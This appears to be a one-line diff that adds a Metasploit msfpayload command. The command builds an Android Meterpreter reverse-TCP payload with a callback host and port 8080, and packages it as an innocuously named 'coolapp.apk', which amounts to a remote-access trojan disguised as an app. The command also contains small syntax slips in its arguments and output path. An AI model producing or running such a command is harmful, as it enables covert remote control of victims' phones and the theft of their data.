@@ -1,0 +1,3 @@
+msfpayload android/meterpreter/reverse_tcp LHOST =Verizon-MiFi7730L-A25E LPORT=8080 R>/root/Desktop?coolapp.apk
+
+
